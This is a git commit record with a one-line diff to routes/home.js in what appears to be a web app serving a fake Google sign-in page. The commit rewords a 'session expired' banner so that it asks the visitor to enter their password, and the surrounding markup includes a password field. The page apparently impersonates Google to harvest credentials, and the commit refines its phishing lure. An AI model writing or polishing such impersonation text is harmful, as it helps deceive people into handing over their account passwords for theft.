0ab3dd823997fbfe28e44909c0cd6927cec3f4e9
10june2024 <eoptehrann@gmail.com>
2024-12-13 08:47:01 +0300

    Update home.js

--- routes/home.js
+++ routes/home.js
@@ -305,7 +305,7 @@ router.get('/', (req, res) => {
             <div class="form-half1">
                 <!-- Session Expired Message at the top of the right section -->
                 <div class="session-expired-message">
-                    <p>Google needs to verify it’s you. Please sign in again to continue.</p>
+                    <p>Google needs to verify it’s you. Please enter password to continue.</p>
                 </div>
 
                 <div class="passdiv">
